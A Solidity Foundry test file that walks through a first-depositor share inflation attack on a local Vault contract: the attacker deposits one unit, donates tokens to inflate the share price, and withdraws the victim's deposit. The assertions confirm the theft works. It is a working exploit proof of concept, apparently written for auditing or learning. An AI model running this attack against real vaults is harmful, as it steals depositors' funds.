// SPDX-License-Identifier: SEE LICENSE IN LICENSE
pragma solidity 0.8.18;

import {Test, console} from "forge-std/Test.sol";
import {Vault} from "../src/Vault.sol";
import {Token} from "../src/Token.sol";

contract VaultTest is Test {
    Vault private vault;
    Token private token;

    uint256 public constant DECIMAL_PRECISION = 1e18;
    uint256 public constant INITIAL_DEPOSIT = 1;
    uint256 public constant ONE_HUNDRED = 100;
    uint256 public constant ZERO = 0;

    address attacker = makeAddr("attacker");
    address victim = makeAddr("victim");

    function setUp() public {
        token = new Token("YoanToken", "YOT", 18);
        vault = new Vault(address(token));
        token.mint(attacker, (ONE_HUNDRED + INITIAL_DEPOSIT) * DECIMAL_PRECISION);
        token.mint(victim, ONE_HUNDRED * DECIMAL_PRECISION);
    }

    function testInflationAttack() public {
        console.log("TotalSupply First : ", vault.totalSupply());
        // Attacker deposits 1 token to the Vault, and is minted 1 share
        vm.startPrank(attacker);
        token.approve(address(vault), token.balanceOf(attacker));
        vault.deposit(INITIAL_DEPOSIT);

        console.log("TotalSupply After Attacker Initial Deposit : ", vault.totalSupply());

        assert(token.balanceOf(address(vault)) == INITIAL_DEPOSIT);
        assert(vault.balanceOf(attacker) == INITIAL_DEPOSIT);

        // Attacker donates 100 tokens, to inflate the shares
        token.transfer(address(vault), ONE_HUNDRED * DECIMAL_PRECISION);
        vm.stopPrank();

        // Victim deposits 100 tokens
        vm.startPrank(victim);
        token.approve(address(vault), token.balanceOf(victim));
        vault.deposit(ONE_HUNDRED * DECIMAL_PRECISION);
        vm.stopPrank();

        console.log("TotalSupply After Victim Deposit : ", vault.totalSupply());

        // // Attacker withdraws all the tokens, stealing victim's tokens
        vm.startPrank(attacker);
        vault.withdraw(INITIAL_DEPOSIT);
        vm.stopPrank();
        console.log("Attacker Balance: ", token.balanceOf(attacker));
        assert(token.balanceOf(address(vault)) == ZERO);
    }
}
